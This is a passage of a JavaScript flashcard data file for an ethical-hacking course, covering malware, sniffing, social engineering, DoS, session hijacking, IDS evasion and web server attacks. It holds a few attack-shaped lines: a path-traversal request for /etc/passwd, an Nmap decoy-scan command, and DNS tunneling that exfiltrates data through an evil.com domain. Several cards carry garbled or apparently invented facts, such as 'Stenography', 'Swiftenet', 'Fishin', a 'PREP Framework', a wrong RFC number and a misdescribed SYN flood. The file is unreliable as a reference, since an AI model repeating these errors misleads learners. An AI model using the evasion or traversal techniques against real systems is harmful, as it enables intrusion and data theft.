                        { q: "What methods are used for maintaining access?", a: "- Backdoors: Disrupt operations or gain unauthorized access\n- Keyloggers: Hardware or software (Metasploit remote keylogger, REFOG, NetBull)\n- Spyware: Screenshots and monitoring (Spytech SpyAgent, iKeyMonitor)\n- Rootkits: Hide presence — hypervisor, firmware, kernel, boot-loader, application, library, memory level\n- NTFS Alternate Data Streams (ADS): Hidden streams in files. Tools: StreamArmor, GMER, ADS Scanner\n- Stenography: Hiding data in images/audio/video. Tools: OpenStego, StegoOnline, DeepSound" },
                        { q: "What are Remote Code Execution techniques?", a: "- Web-browser based exploitation (spear phishing)\n- Office-application based exploitation\n- WMI (Windows Management Instrumentation)\n- WinRM (Windows Remote Management)\n- Tools: Dameware, Ninja, Pupy, PsExec, PDQ Deploy, ManageEngine Endpoint Central" },
                        { q: "What are Active Directory persistence attacks?", a: "- Skeleton Key: Inject false credentials, memory resident virus (Mimikatz)\n- Overpass the Hash (OpT): Extension of pass-the-ticket/pass-the-hash using Mimikatz\n- Malicious Replication: Copy user data using admin credentials\n- WMI Event Subscription persistence (PowerLurk)\n- AdminSDHolder abuse: SDProp process protects high-privilege accounts" },
                        { q: "How do attackers hide evidence of compromise?", a: "- Disable auditing\n- Clear logs (Metasploit meterpreter)\n- Manipulate logs\n- Cover tracks on network/OS\n- Delete files / Hide artifacts\n- Disable Windows functionality\n- Use cipher.exe to delete files securely" }
                    ]
                },
                {
                    title: "Hacking Methods",
                    cards: [
                        { q: "What is the hacker methodology?", a: "1) Gaining Access\n2) Escalating Privileges\n3) Executing Applications\n4) Hiding Files/Processes\n5) Harvesting Credentials\n6) Exploiting Weaknesses\n7) Lateral Movement" },
                        { q: "What is privilege escalation?", a: "The process of exploiting a bug, design flaw, or misconfiguration to gain elevated access to resources that are normally protected. Types: vertical (to admin/root) and horizontal (to same-level user)." },
                        { q: "What tools are used for system hacking?", a: "Mimikatz (credential dumping), Metasploit (exploitation framework), John the Ripper/Hashcat (password cracking), Netcat (network tool), PowerShell Empire (post-exploitation), and Cobalt Strike." }
                    ]
                }
            ]
        },
        {
            id: 7,
            title: "Malware Threats",
            sections: [
                {
                    title: "Advanced Malware Types",
                    cards: [
                        { q: "What is Fileless Malware?", a: "- Operates entirely in memory without writing to disk\n- Uses legitimate system tools (PowerShell, WMI) for execution\n- Extremely difficult to detect with traditional antivirus\n- Common techniques: PowerShell -encodedcommand, WMI event subscriptions" },
                        { q: "What is Polymorphic Malware?", a: "- Changes its code signature each time it replicates while keeping the original algorithm intact\n- Uses mutation engines to evade signature-based AV detection\n- Different from Metamorphic which rewrites ENTIRE code structure" },
                        { q: "What is Metamorphic Malware?", a: "- Rewrites its entire code structure each time it infects a system\n- Performs same function with completely different code\n- More advanced than polymorphic — changes both signature AND behavior patterns" },
                        { q: "What is a Logic Bomb?", a: "- Malicious code triggered by specific conditions (date, event, password)\n- Lies dormant until trigger condition is met\n- Often used by disgruntled employees with insider access" },
                        { q: "What is a Worm vs Virus difference?", a: "- Virus: Requires host file and human action to spread (opens attachment, runs program)\n- Worm: Standalone malware that self-replicates across networks WITHOUT user interaction\n- Worms spread faster but viruses can be more destructive" },
                        { q: "What are Trojan types?", a: "- Downloader Trojan: Downloads additional malware\n- Dropper Trojan: Deploys other malware onto system\n- Backdoor Trojan: Creates unauthorized access channel\n- DDoS Trojan: Joins botnet for distributed attacks\n- Banking Trojan: Steals financial credentials\n- RAT (Remote Access Trojan): Full remote control of infected system" }
                    ]
                },
                {
                    title: "APT & Botnets",
                    cards: [
                        { q: "What is an Advanced Persistent Threat (APT)?", a: "- Sophisticated, long-term targeted attack\n- Intruder gains access and remains undetected for extended period\n- Typically state-sponsored or highly organized groups\n- Uses custom malware and zero-day exploits\n- Examples: APT28 (Fancy Bear), APT29 (Cozy Bear), Lazarus Group" },
                        { q: "What is a Botnet?", a: "- Network of compromised computers (bots/zombies) controlled by C&C (Command and Control) servers\n- Used for DDoS attacks, spam distribution, cryptomining, credential stuffing\n- C&C models: Hub-and-spoke, P2P, DNS-based\n- Famous botnets: Mirai (IoT), Emotet, TrickBot, QakBot" },
                        { q: "What is Cryptomining Malware?", a: "- Hijacks victim system resources to mine cryptocurrency\n- Uses Proof-of-Work algorithms to solve cryptographic puzzles\n- Also called 'Cryptojacking'\n- Can be inline (web-based) or installed (malware)\n- Signs: High CPU/GPU usage, increased power consumption" },
                        { q: "What is Ransomware and its types?", a: "- Encrypts files and demands payment for decryption\n- Crypto-ransomware: Encrypts files on victim system\n- Locker-ransomware: Locks user out of device/screen\n- Double Extortion: Steals data THEN encrypts (threatens to leak)\n- Examples: WannaCry, Ryuk, LockBit, BlackCat/ALPHV" },
                        { q: "What is the Stuxnet worm?", a: "- Discovered in 2010, targeted Iranian nuclear facilities\n- Specifically attacked Siemens SCADA systems to disrupt centrifuge operations\n- Used multiple zero-day exploits\n- Considered the first cyberweapon targeting physical infrastructure\n- Demonstrated APT capabilities with nation-state resources" }
                    ]
                },
                {
                    title: "Malware Analysis",
                    cards: [
                        { q: "What are Malware Analysis methods?", a: "- Static Analysis: Examining code without running it\n  - Disassembly, strings extraction, header analysis\n  - File hash checking (MD5, SHA256)\n  - PE file analysis\n- Dynamic Analysis: Running malware in controlled environment\n  - Sandbox execution (Cuckoo, Joe Sandbox)\n  - Network traffic observation\n  - File modification tracking\n  - Registry changes monitoring\n  - Process behavior analysis" },
                        { q: "What tools are used for Malware Analysis?", a: "- Static: IDA Pro, Ghidra, PEiD, strings, exiftool\n- Dynamic: Sandbox (Cuckoo, ANY.RUN, Joe Sandbox)\n- Debuggers: OllyDbg, x64dbg, GDB\n- Network: Wireshark, TCPView\n- System Monitoring: Process Monitor, Process Explorer, API Monitor\n- Memory Analysis: Volatility" },
                        { q: "What is Social Engineering in Malware Distribution?", a: "- Tricking users into executing malware through manipulation\n- Common vectors:\n  - Phishing emails with malicious attachments\n  - Drive-by downloads from compromised websites\n  - Malicious USB drives (Baiting)\n  - Compromised software updates\n  - Fake security alerts" },
                        { q: "What is a Rootkit and how to detect it?", a: "- Collection of tools used by attackers to hide presence on system\n- Levels: User-mode, Kernel-mode, Hypervisor-level, Firmware/BIOS, Boot-loader\n- Detection:\n  - Integrity-based detection (Tripwire, AIDE baseline)\n  - Analyzing memory dumps\n  - Comparing process lists (rootkit vs OS view)\n- Anti-Rootkit tools: GMER (SirMed), Stinger, TDSSKiller, Avast One" }
                    ]
                },
                {
                    title: "Malware Overview",
                    cards: [
                        { q: "What is malware?", a: "Any program or file that is intentionally harmful. Types include viruses, worms, trojans, ransomware, spyware, adware, rootkits, and logic bombs." },
                        { q: "What is the difference between a virus and a worm?", a: "A virus requires a host file and human action to spread. A worm is standalone malware that self-replicates across networks without user interaction." },
                        { q: "What is a trojan horse?", a: "Malicious code or program disguised as legitimate software. Unlike viruses and worms, trojans do not self-replicate. Types include downloaders, droppers, backdoor trojans, and DDoS trojans." },
                        { q: "What is ransomware?", a: "Malware that encrypts files on the victim's system and demands payment for decryption. Types: crypto-ransomware (encrypts files) and locker-ransomware (locks screen). Modern variants use double extortion (steal + encrypt data)." },
                        { q: "What is a rootkit?", a: "A collection of tools used by an attacker to hide their presence on a system. Rootkits operate at different levels: user-mode, kernel-mode, hypervisor-level, or firmware/BIOS level." },
                        { q: "What is polymorphic malware?", a: "Malware that changes its code (signature) each time it replicates while keeping the original algorithm intact. Designed to evade signature-based antivirus detection using mutation engines." },
                        { q: "What is metamorphic malware?", a: "Malware that rewrites its entire code structure each time it infects a system, performing the same function but with completely different code. More advanced than polymorphic as it changes both signature AND behavior patterns." },
                        { q: "What is fileless malware?", a: "Malware that operates entirely in memory without writing to disk. Uses legitimate system tools (PowerShell, WMI) to execute malicious activities, making it difficult to detect with traditional antivirus." },
                        { q: "What is an APT (Advanced Persistent Threat)?", a: "A sophisticated, long-term targeted attack where an intruder gains access to a network and remains undetected for an extended period. Typically state-sponsored or highly organized groups using custom malware and zero-day exploits." },
                        { q: "What is cryptomining malware?", a: "Malware that hijacks a victim's system resources to mine cryptocurrency without consent. Uses algorithms like Proof-of-Work to solve cryptographic puzzles. Also called cryptojacking." },
                        { q: "How do you analyze malware?", a: "Static analysis (examining code without running it — disassembly, strings, headers) and Dynamic analysis (running malware in a sandbox/virtual machine to observe behavior — network connections, file modifications, registry changes)." },
                        { q: "What is social engineering in the context of malware distribution?", a: "Tricking users into executing malware through manipulation. Common vectors: phishing emails, malicious attachments, drive-by downloads, and compromised websites." },
                        { q: "What is a botnet?", a: "A network of compromised computers (bots/zombies) controlled by an attacker through C&C (Command and Control) servers. Used for DDoS attacks, spam distribution, and cryptomining." }
                    ]
                }
            ]
        },
        {
            id: 8,
            title: "Sniffing",
            sections: [
                {
                    title: "Network Sniffing & Switched Networks",
                    cards: [
                        { q: "What is Network Sniffing?", a: "- Process of capturing and analyzing network traffic flowing across a network\n- Sniffers used for legitimate troubleshooting OR malicious credential theft\n- Works easily on hubs, less effective on switched networks\n- Can capture: passwords, emails, files, session tokens" },
                        { q: "What is ARP Poisoning / ARP Spoofing?", a: "- Technique sending fake ARP messages to link attacker's MAC with IP of legitimate device\n- Enables Man-in-the-Middle (MitM) attack\n- Victim traffic flows through attacker's system\n- Attacker can intercept, modify, or drop packets\n- On switched networks, this is primary method for sniffing" },
                        { q: "What tools are used for Sniffing and MitM?", a: "- Wireshark: Advanced packet analyzer (GUI)\n- Tcpdump: Command-line packet capture (Linux/macOS)\n- Cain & Abel: Password cracker + sniffer (Windows)\n- Bettercap: Network attack and monitoring tool\n- Responder: LLMNR/NBT-NS/mDNS poisoner and credential harvester\n- Ethereal (old name, now Wireshark)\n- X-Wireshark" },
                        { q: "What is Traffic Analysis?", a: "- Analyzing network traffic patterns WITHOUT reading content\n- Can reveal communication patterns, frequency, volume, parties involved\n- Useful even when traffic is encrypted\n- Tools: Wireshark statistics, Maltego, NetworkMiner" },
                        { q: "How does Sniffing work on Switched Networks?", a: "- Switches forward frames only to destination MAC (unlike hubs)\n- Countermeasures to enable sniffing:\n  - ARP Poisoning (primary method)\n  - MAC Flooding (overflow switch CAM table → acts like hub)\n  - DHCP Starvation (create rogue DHCP server)\n  - Port Mirroring (configure switch to copy traffic)" },
                        { q: "What is MAC Flooding Attack?", a: "- Flood switch CAM table with thousands of fake MAC addresses\n- When table overflows, switch enters 'fail-open' mode\n- Switch behaves like a hub, broadcasting all traffic\n- Enables sniffing on previously switched network" },
                        { q: "How to sniff Encrypted Traffic?", a: "- Captured packets show encrypted ciphertext only\n- Methods:\n  - Obtain private key (server compromise)\n  - SSL Strip (downgrade HTTPS to HTTP — MitM tool)\n  - Exploit weak TLS implementations\n  - Certificate pinning bypass\n  - Man-in-the-middle with self-signed certificate" }
                    ]
                },
                {
                    title: "Sniffing Basics",
                    cards: [
                        { q: "What is network sniffing?", a: "The process of capturing and analyzing network traffic flowing across a network. Sniffers can capture packets for legitimate troubleshooting or malicious purposes like credential theft." },
                        { q: "What is ARP poisoning?", a: "A technique where an attacker sends fake ARP messages to link their MAC address with the IP address of a legitimate device on the network. This allows them to intercept traffic meant for that IP (Man-in-the-Middle attack)." },
                        { q: "What tools are used for sniffing?", a: "Wireshark (packet analyzer), Tcpdump (command-line packet capture), Network Monitor, Cain & Abel (password cracker/sniffer), and Bettercap (network attack tool)." }
                    ]
                }
            ]
        },
        {
            id: 9,
            title: "Social Engineering",
            sections: [
                {
                    title: "Psychological Principles & Advanced Techniques",
                    cards: [
                        { q: "What psychological principles does Social Engineering exploit?", a: "- Authority: People obey figures of authority (IT admin, police)\n- Scarcity: Limited availability creates urgency\n- Urgency: Time pressure prevents rational thinking\n- Familiarity/Liking: People help those they like/know\n- Consistency: People follow through on previous commitments\n- Reciprocity: Feeling obligated to return favors" },
                        { q: "What is the PREP Framework in Social Engineering?", a: "- Positioning: Establish credibility and role\n- Rapport: Build trust and connection with target\n- Extraction: Gather information gradually\n- Prestige: Make target feel honored to help (appeals to ego)" },
                        { q: "What are advanced phishing techniques?", a: "- Spear Phishing: Targeted at specific individual using personal info\n- Whaling: Targeting C-level executives and senior management\n- BizEmail/CEO Fraud: Impersonating executive to request wire transfers\n- Pharming: Redirecting traffic to fake websites via DNS poisoning\n- Waterholing: Compromising websites target group frequently visits\n- Fishin (Whaling variant): Large-scale targeting of organizations\n- Clone Phishing: Resending legitimate email with malicious link" },
                        { q: "What is Domain Spoofing?", a: "- Registering domain similar to legitimate one:\n  - microsoft.com → microsof.com (missing letter)\n  - company.com → companny.com (double letter)\n  - company.com.co (extra TLD)\n- Used in phishing emails and fake login pages" },
                        { q: "What is QR Code Phishing (Quishing)?", a: "- QR codes used as attack vector in phishing\n- Directs victim to malicious URLs without showing URL until after scan\n- Bypasses email security filters that can't scan QR codes\n- Common in parking tickets, event tickets, WiFi access" }
                    ]
                },
                {
                    title: "Physical SE & Prevention",
                    cards: [
                        { q: "What are Physical Social Engineering attacks?", a: "- Tailgating/Piggybacking: Following authorized person into restricted area\n- Shoulder Surfing: Watching victim type password or view screen\n- Eavesdropping: Listening to conversations for information\n- Dumpster Diving: Searching trash for sensitive documents\n- Baiting: Leaving infected USB drives in parking lots\n- Impersonation: Wearing uniform, using fake ID badge" },
                        { q: "How to prevent Social Engineering attacks?", a: "- Employee training and awareness programs (MOST IMPORTANT)\n- Implement verification procedures for sensitive requests\n- Multi-factor authentication (reduces credential theft impact)\n- Security policies and documented procedures\n- Regular phishing simulations\n- Physical security measures (badge readers, mantraps)\n- Email filtering and DMARC/DKIM/SPF records\n- Report suspicious activity without punishment" },
                        { q: "What is OSINT in Social Engineering context?", a: "- Open Source Intelligence: Gathering info from public sources\n- Sources: Social media (LinkedIn, Facebook, Twitter), company websites, press releases, public records\n- Used to personalize attacks and build credibility\n- Tools: TheHarvester, Maltego, SpiderFoot, Recon-ng" }
                    ]
                },
                {
                    title: "Social Engineering Overview",
                    cards: [
                        { q: "What is social engineering?", a: "The psychological manipulation of people into performing actions or disclosing confidential information. It exploits human psychology principles: authority, scarcity, urgency, familiarity, and consensus." },
                        { q: "What are common social engineering techniques?", a: "Phishing, Spear Phishing, Whaling (targeting executives), Pretexting (creating fake scenarios), Baiting (offering something enticing), Tailgating (physical following), Quid Pro Quo (offering service in exchange for info)." },
                        { q: "What is phishing?", a: "Fraudulent attempt to obtain sensitive information by disguising as a trustworthy entity in electronic communication. Types: email phishing, smishing (SMS), vishing (voice), credential harvesting via fake websites." },
                        { q: "What is spear phishing?", a: "A targeted phishing attack directed at a specific individual or organization. Uses personalized information gathered through reconnaissance to make the attack more convincing and effective." },
                        { q: "What is pretexting?", a: "Creating a fabricated scenario (pretext) to engage the victim and extract information. The attacker researches the target beforehand to create a believable story, often impersonating IT support or law enforcement." },
                        { q: "What is tailgating?", a: "A physical social engineering attack where an unauthorized person follows an authorized person into a restricted area. Often done by carrying items that make it seem like they 'deserve' to enter." },
                        { q: "What is waterholing?", a: "A social engineering attack where attackers identify websites regularly visited by their target group and compromise those sites. When targets visit the compromised site, malware is delivered to them." },
                        { q: "How do you prevent social engineering attacks?", a: "1) Employee training and awareness programs\n2) Implementing verification procedures\n3) Multi-factor authentication\n4) Security policies\n5) Regular phishing simulations\n6) Physical security measures" }
                    ]
                }
            ]
        },
        {
            id: 10,
            title: "Denial-of-Service",
            sections: [
                {
                    title: "DoS/DDoS Attack Types & Defense",
                    cards: [
                        { q: "What are the three categories of DDoS attacks?", a: "- Volumetric (Bandwidth): Floods target with traffic\n  - UDP floods, ICMP floods, Amplification attacks (DNS, NTP, Memcached)\n  - Measured in bits per second (bps)\n- Protocol (State Exhaustion): Exhausts server resources\n  - SYN floods, Ping of Death, Smurf attack, Fraggle\n  - Measured in packets per second (pps)\n- Application Layer (Layer 7): Targets application resources\n  - HTTP flood, Slowloris, RST flood, Zero-Day DDoS\n  - Measured in requests per second (rps)" },
                        { q: "What is a SYN Flood Attack?", a: "- Exploits TCP three-way handshake\n- Attacker sends many SYN requests but never completes with SYN-ACK\n- Target's connection table fills up with half-open connections\n- Legitimate users cannot establish connections\n- Mitigation: SYN cookies, connection rate limiting" },
                        { q: "What is a Smurf Attack?", a: "- Sends ICMP echo requests (pings) to broadcast addresses\n- Source IP is spoofed to victim's address\n- All hosts on network reply to victim simultaneously\n- Amplification factor = number of hosts on broadcast network\n- Modern networks block directed broadcast, reducing risk" },
                        { q: "What is a Ping of Death?", a: "- Sends malformed or oversized ICMP packets (>65,535 bytes)\n- Target system crashes trying to reassemble fragmented packets\n- Mostly patched in modern systems but still relevant for legacy/IoT" },
                        { q: "What is Slowloris Attack?", a: "- Application Layer (Layer 7) attack\n- Opens multiple connections to web server and keeps them open\n- Sends partial HTTP requests with slow intervals\n- Server connection slots fill up, denying new connections\n- Uses very little bandwidth, hard to detect" },
                        { q: "What is DNS Amplification?", a: "- Type of volumetric amplification attack\n- Attacker sends DNS queries with spoofed source IP (victim) to open DNS resolvers\n- DNS response is much larger than query (amplification)\n- Can achieve 28x+ amplification factor\n- Mitigation: Implement BCP38/BCP84, disable open resolvers" },
                        { q: "What tools are used for DoS/DDoS attacks?", a: "- LOIC (Low Orbit Ion Cannon): Basic traffic flood tool\n- HOIC (High Orbit Ion Cannon): Enhanced LOIC with presets\n- Slowloris: HTTP Slowloris attack tool\n- MFlood: Memory-efficient DDoS tool\n- GoldenEye: Lightweight DoS tool\n- Botnet-based attacks (Mirai, etc.)\n- Stresser/Booter services (commercial abuse)" },
                        { q: "What are DDoS mitigation strategies?", a: "- Rate limiting and throttling\n- Traffic filtering with ACLs\n- Blackhole routing (RFC 3896)\n- Content Delivery Networks (CDN — Cloudflare, Akamai)\n- Anycast network distribution\n- Intrusion Prevention Systems (IPS)\n- Redundant infrastructure across multiple datacenters\n- DDoS protection services: AWS Shield, Cloudflare Protection, Akamai Prolexic\n- ISP-level scrubbing centers" },
                        { q: "What is the difference between DoS and DDoS?", a: "- DoS (Denial of Service): Attack from single source/system\n- DDoS (Distributed DoS): Attack from multiple compromised systems (botnet)\n- DDoS is more powerful, harder to block (many sources)\n- DoS can often be stopped by blocking one IP address" },
                        { q: "What is a Stresser/Booter service?", a: "- Commercial services that rent DDoS capability to users\n- Often marketed for 'network testing'\n- Can be abused for illegal attacks\n- Law enforcement has shut down many (e.g., GameOver, AfterLife)\n- Many operate from jurisdictions with weak cyber laws" }
                    ]
                },
                {
                    title: "DoS/DDoS Overview",
                    cards: [
                        { q: "What is a DoS attack?", a: "An attempt to make a machine or network unavailable to its intended users by disrupting services. The attacker sends traffic that overwhelms the target's resources (bandwidth, CPU, memory)." },
                        { q: "What is a DDoS attack?", a: "A distributed denial-of-service attack using multiple compromised systems (botnet) to flood the target with traffic. More powerful than single-source DoS because it comes from many sources simultaneously." },
                        { q: "What are common DDoS attack types?", a: "1) Volumetric (UDP floods, ICMP floods, amplification attacks)\n2) Protocol (SYN floods, ping of death, Smurf attack)\n3) Application Layer (HTTP flood, Slowloris, RST flood)" },
                        { q: "What is a SYN flood attack?", a: "Exploits the TCP three-way handshake by sending many SYN requests but never completing with SYN-ACK. The target's connection table fills up, preventing legitimate connections." },
                        { q: "What is a Smurf attack?", a: "A DDoS attack that sends ICMP echo requests (pings) to broadcast addresses with a spoofed source IP of the victim. All hosts on the network reply to the victim, overwhelming it with traffic." },
                        { q: "What tools are used for DoS/DDoS attacks?", a: "LOIC (Low Orbit Ion Cannon), HOIC (High Orbit Ion Cannon), Slowloris, MFlood, and botnet-based attacks. Defensively: Cisco F5 Big-IP, Cloudflare, Akamai DDoS protection." },
                        { q: "How do you prevent DoS/DDoS attacks?", a: "1) Rate limiting\n2) Traffic filtering/ACLs\n3) Blackhole routing\n4) Content delivery networks (CDN)\n5) Anycast network distribution\n6) Intrusion prevention systems (IPS)\n7) Redundant infrastructure" }
                    ]
                }
            ]
        },
        {
            id: 11,
            title: "Session Hijacking",
            sections: [
                {
                    title: "TCP Session Hijacking & Application Level",
                    cards: [
                        { q: "What is Session Hijacking?", a: "Taking control of a valid TCP communication session. Most authentications only occur at the start of TCP session. Valid session ID is stolen to authenticate with server.\n- Phases:\n  1) Tracking connection — sniffer + Nmap for predictable sequences\n  2) Desynchronizing — send null data/reset flag to change SEQ/ACK\n  3) Injecting packets — inject data or participate as MITM" },
                        { q: "What is Passive vs Active Session Hijacking?", a: "- Passive: Only observe and record traffic, capture IDs/passwords without disturbing session\n- Active: Takes over active session by breaking connection or actively participating (MITM). Must guess sequence number before target responds." },
                        { q: "What are TCP Session Hijacking types?", a: "- TCP/IP Hijacking: Sniff connection → send spoofed packet with predicted seq → desynchronize victim → attacker spoofs as victim\n- IP Spoofing (Source Routing): Spoof trusted IP → inject forged packets before host responds → server accepts attacker packets\n- RST Hijacking: Inject spoofed TCP RST packet to forcibly terminate session\n- Blind Hijacking: Attacker cannot see responses, predicts sequence numbers to inject data\n- UDP Hijacking: Send forged server reply to victims UDP request (stateless protocol)" },
                        { q: "What are Application Level Session Hijacking methods?", a: "- Stealing: Different techniques to steal session IDs (XSS, cookies)\n- Guessing: Try to guess session ID by observing session variables\n- Brute forcing: All possible permutations of session ID\n- Session Sniffing: Read HTTP header cookies or body parameters" },
                        { q: "What is Predicting Session Tokens?", a: "- Sequential tokens: Easily predictable incrementing IDs\n- Timestamp based tokens: Based on time, can be predicted\n- Small token space: Limited range allows brute force\n- Weak RNG: PRNG algorithms with predictable output\n- Lack of rate limiting allows rapid guessing" },
                        { q: "What is Man-in-the-Browser attack?", a: "- Trojan infects computer → installs malicious code → after browser restart code loads\n- Handler registered for every webpage visit\n- Extension matches URL with known targeted sites\n- When user logs in, extension extracts DOM field values and modifies them\n- Browser sends modified values to server → server processes" },
                        { q: "What is Cross-Site Request Forgery (CSRF)?", a: "- Exploits trust in authenticated user session\n- Victim clicks link → browser automatically includes cookies/session tokens\n- Application does not verify request origin\n- Prevention: Anti-CSRF tokens, SameSite cookies" }
                    ]
                },
                {
                    title: "Client-Side Session Attacks",
                    cards: [
                        { q: "What is Session Fixation?", a: "- Attacker sets session ID in advance (via link, cookie)\n- Victim logs in using attacker-known session ID\n- Session ID not regenerated after authentication\n- Prevention: Regenerate session ID after login" },
                        { q: "What is CRIME Attack?", a: "- Compression Ratio Leak Made Easy\n- Client-side attack exploiting TLS/HTTP compression ratio\n- Infers cookies by analyzing compressed packet sizes\n- Applies to SSL/TLS, SPDY, HTTPS\n- Prevention: Disable TLS compression" },
                        { q: "What is FREAK / Forbidden Attack?", a: "- FREAK (Factoring RSA Export Keys): Forces downgrade to weak export-grade crypto\n- Forbidden Attack: MITM exploiting reuse of cryptographic nonce during TLS handshake\n- AES-GCM cipher exploitation\n- Prevention: Strong ciphers, TLS hardening" },
                        { q: "What is Session Donation Attack?", a: "- Attacker logs into shared session → victim clicks link → victim authenticates attacker's session → attacker gains victim's data\n- Prevention: Bind session to user/IP/device" }
                    ]
                },
                {
                    title: "Session Hijacking Overview",
                    cards: [
                        { q: "What are types of session hijacking?", a: "1) Network hijacking (intercepting traffic)\n2) Web session hijacking (stealing cookies)\n3) Man-in-the-Middle attacks\n4) Cross-site scripting (XSS) for cookie theft" },
                        { q: "How do you prevent session hijacking?", a: "1) Use HTTPS with secure cookies\n2) Implement session ID rotation after login\n3) Set proper cookie flags (HttpOnly, Secure, SameSite)\n4) Use TLS encryption\n5) Implement CSRF tokens\n6) Monitor for anomalous session activity" }
                    ]
                }
            ]
        },
        {
            id: 12,
            title: "Evading IDS, Firewalls & Honeypots",
            sections: [
                {
                    title: "IDS Evasion & Firewall Bypass",
                    cards: [
                        { q: "What are IDS evasion techniques?", a: "- Fragmentation: Split packets to evade signature detection\n- Junk Data Injection: Add random data before payload\n- Timing Manipulation: Slow down scanning to avoid threshold triggers\n- Decoy Scanning: Scan from multiple IPs simultaneously (Nmap -D flag)\n- OS Fingerprint Evasion: Send packets that mimic different OS behaviors\n- Packet Reordering: Send packets out of expected order" },
                        { q: "What is Fragmentation for IDS evasion?", a: "- Split malicious payload into smaller fragments\n- Each fragment individually appears harmless\n- IDS may not reassemble before inspection\n- Target system reassembles and executes the payload\n- Nmap: -f flag (minimum fragmentation)" },
                        { q: "What tools help with IDS evasion?", a: "- Nmap options: -f (fragment), -D (decoys), -S (spoofed IP), -g (source port)\n- Scapy: Custom packet crafting\n- Swiftenet: IDS/IPS evasion framework\n- P0f: OS fingerprinting with evasion\n- Fragment Scanner" },
                        { q: "What is Decoy Scanning?", a: "- Nmap -D flag sends packets from multiple fake source IPs simultaneously\n- Example: nmap -D decoy1,decoy2,yourIP target\n- IDS sees traffic from all decoys, making it hard to identify real scanner\n- Can use random or specified decoy IPs" },
                        { q: "What are Firewall evasion techniques?", a: "- IP Fragmentation: Bypass packet inspection by fragmenting\n- Tunneling: Encapsulate traffic inside allowed protocols (HTTP tunneling)\n- DNS Tunneling: Exfiltrate data via DNS queries\n- IPv6 Tunneling through IPv4-only firewalls\n- Use legitimate ports/protocols to blend in" },
                        { q: "What is TCP Wrapping?", a: "- Encapsulate malicious TCP packet inside another TCP packet\n- Outer packet passes firewall inspection\n- Inner packet contains actual payload\n- Used to bypass stateful firewalls" },
                        { q: "What is DNS Tunneling?", a: "- Encode data in DNS queries to bypass firewalls\n- Domain: encoded-data.evil.com\n- DNS server acts as relay for exfiltrated/stolen data\n- Tools: iodine, dnscat2, dns2tcp" }
                    ]
                },
                {
                    title: "Honeypot Detection & IPS",
                    cards: [
                        { q: "What is a Honeypot?", a: "- Decoy system designed to attract attackers and study their behavior\n- Types:\n  - Production Honeypot: Easy to deploy, used by organizations for defense\n  - Research Honeypot: Complex, used for security research\n  - Threat Intelligence Honeypot: Collects attacker TTPs" },
                        { q: "What are Honeypot detection methods?", a: "- Check for unusual services running (honeyd may have limited service implementations)\n- Analyze response signatures (honeypots may have simplified responses)\n- Port scanning with timing analysis\n- Check for duplicate MAC addresses on multiple IPs\n- Analyze TCP/IP stack behavior differences" },
                        { q: "What is the difference between IDS and IPS?", a: "- IDS (Intrusion Detection System): Monitors and alerts on suspicious activity\n- IPS (Intrusion Prevention System): Actively blocks/monitors malicious traffic\n- IDS: Passive, out-of-band deployment\n- IPS: Active, inline deployment — can drop packets" },
                        { q: "What are IPS bypass techniques?", a: "- Exploit blind spots in IPS inspection\n- Use encryption to hide payload content\n- Slow down attacks to stay below thresholds\n- Fragment traffic across multiple sessions\n- Target application-layer vulnerabilities that IPS signatures don't cover" }
                    ]
                },
                {
                    title: "IDS/IPS Overview",
                    cards: [
                        { q: "What is an IDS?", a: "Intrusion Detection System. Monitors network or system activities for malicious activities or policy violations. Types: NIDS (Network-based), HIDS (Host-based). Signature-based vs. Anomaly-based detection." },
                        { q: "What is an IPS?", a: "Intrusion Prevention System. Similar to IDS but actively blocks detected threats in real-time. Can drop packets, reset connections, or block IP addresses when malicious activity is detected." },
                        { q: "What are evasion techniques?", a: "1) Fragmentation attacks\n2) Decoy scanning\n3) Timing scans to blend with normal traffic\n4) Spoofing source IPs\n5) Using tunneling (DNS, ICMP)\n6) Polymorphic attacks\n7) Slow scanning to avoid thresholds" },
                        { q: "What is a honeypot?", a: "A decoy system designed to attract attackers and study their behavior. Types: research honeypots (academic), production honeypots (deployed by organizations for early warning). Low interaction vs. High interaction." }
                    ]
                }
            ]
        },
        {
            id: 13,
            title: "Hacking Web Servers",
            sections: [
                {
                    title: "Web Server Attack Vectors & Hardening",
                    cards: [
                        { q: "What are common Web Server attack vectors?", a: "- Misconfigurations: Default pages, directory listing, weak SSL/TLS\n- Outdated software: Known vulnerabilities in web server version\n- Weak authentication: Default credentials, weak password policies\n- Server-side extensions: ASP, PHP, JSP vulnerabilities\n- CGI scripts: Buffer overflows, command injection" },
                        { q: "What are Web Server information gathering techniques?", a: "- Identify server type/version (curl -I, Nmap, WhatWeb)\n- Look for default pages and test pages\n- Check for directory listing enabled\n- Enumerate virtual hosts\n- Analyze HTTP headers for technology stack\n- Use tools: Nikto, DirBuster, Gobuster" },
                        { q: "What is Directory Traversal Attack?", a: "- Exploits insufficient input validation to access files outside web root\n- Uses ../ sequences to navigate directories\n- Example: GET /../../etc/passwd\n- OWASP Path Traversal prevention: Validate and sanitize input, use chroot" },
                        { q: "How to harden Web Servers?", a: "- Remove default pages and test files\n- Disable directory listing\n- Use strong SSL/TLS configurations\n- Keep software updated\n- Restrict HTTP methods (allow only GET, POST, HEAD)\n- Implement WAF (Web Application Firewall)\n- Use security headers (X-Frame-Options, CSP, HSTS)\n- Regular vulnerability scanning" },
                        { q: "What are essential Web Server security headers?", a: "- X-Frame-Options: DENY/SAMEORIGIN — prevent clickjacking\n- X-Content-Type-Options: nosniff — prevent MIME sniffing\n- Strict-Transport-Security (HSTS): Force HTTPS\n- Content-Security-Policy (CSP): Control resource loading\n- X-XSS-Protection: Enable XSS filter\n- Referrer-Policy: Control referrer information" }
                    ]
                },
                {
                    title: "Web Server Attacks Overview",
                    cards: [
                        { q: "What are common web server vulnerabilities?", a: "1) Outdated software\n2) Misconfigurations\n3) Default credentials\n4) Directory traversal\n5) Server-side includes attacks\n6) CGI script vulnerabilities\n7) HTTP request smuggling" },
                        { q: "What is directory traversal?", a: "An attack that uses '...' (../ or ..\\) sequences to access files and directories outside the intended root directory. Can expose sensitive files like /etc/passwd, web.config, or application source code." },
                        { q: "How do you secure web servers?", a: "1) Keep software updated\n2) Disable unnecessary services/modules\n3) Use strong authentication\n4) Implement WAF (Web Application Firewall)\n5) Regular security audits\n6) Proper file permissions\n7) HTTPS enforcement" }
                    ]
                }
            ]
        },
        {
            id: 14,
            title: "Hacking Web Applications",
            sections: [
                {
                    title: "OWASP Top 10 & XSS",
                    cards: [
